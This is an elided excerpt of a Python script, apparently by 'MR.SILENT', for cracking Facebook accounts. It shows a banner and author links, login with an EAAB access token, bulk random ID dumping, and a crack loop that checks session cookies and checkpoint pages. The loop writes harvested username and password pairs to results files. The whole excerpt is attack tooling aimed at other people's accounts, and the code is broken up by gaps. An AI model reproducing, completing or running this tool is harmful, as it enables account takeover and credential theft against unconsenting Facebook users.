...
def logo():
 ...
 ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\n{N} ▌│█║▌║▌║META FACEBOOK METHOD MR.SILENT║▌║▌║█│▌{N} """)
    ...
    print(f"║{P}[{H}•{P}] Facebook  : Mr.Silentraymond.aurelioloud.9        {N}║")
    print(f"║{P}[{H}•{P}] Group Team    : {N} M R. S I L E N T.                             ║")
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCRACK BY MR.SILENT META SC DONE...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            print(f"\n [{M}!{N}] Don't be empty");results(ok,cp)
        elif cek_cp in["Y","y"]:
...
def infoauthor():
        print("%s══════════════════════════════════════════"%(N))
        jalan(f" {BM}{P}SC INFO{N}\n [{H}•{N}] Author SC : {K} SILENT\n {N}[{H}•{N}] Facebook : {K}+https://www.facebook.com/Mr.Silentraymond.aurelioloud.9\n {N}[{H}•{N}] Github : {K}https://github.com/MR-SILENT\n {N}[{H}•{N}] Status SC : Gratis rasa {H}Premium{N}\n {N}[{H}•{N}] WARNING : DO NOT SELL BUY USERNAME & PASSWORD SC META.{N}\n\n {BM}FIX BUG{N}\n [{H}✓{N}] An error occurred when playing airplane mode while the crack process was running, has now been fixed and can be played in airplane mode when the crack process is running\n [{H}✓{N}] Slight changes to the color of the text and appearance SC\n [{H}✓{N}] Default user agent change SC\n [{H}✓{N}] Addition showing {H}Web & ACTIVE APP{N}")
...
#LOGIN TOKEN
def login_token():
    #print('\n %s[%s!%s] Use a Valid EAAB Token, if using an invalid EAAB Token will result in %sGAGAL DUMPID%s'%(N,M,N,M,N))
...
def moch_yayan():
    ...
    print(' [%s02%s] Random ID Bulk (%sON%s)'%(H,N,H,N));time.sleep(0.03)
    ...
    if "c_user" in session.cookies.get_dict():
        ...
        if(len(cek)==0):
            if "View the login details displayed. This you?" in title:
                ...
                open('results/ERROR.txt', 'a').write(f"[SILENT-CP] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
        ...
        if ___yayanganteng___ in ('raraY', 'raray'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('METASILENTID', 'Metasilentid', 'metasilentid'):
            self.tampilkan_apk()
            mentod()
            self.__pler__()
        else:
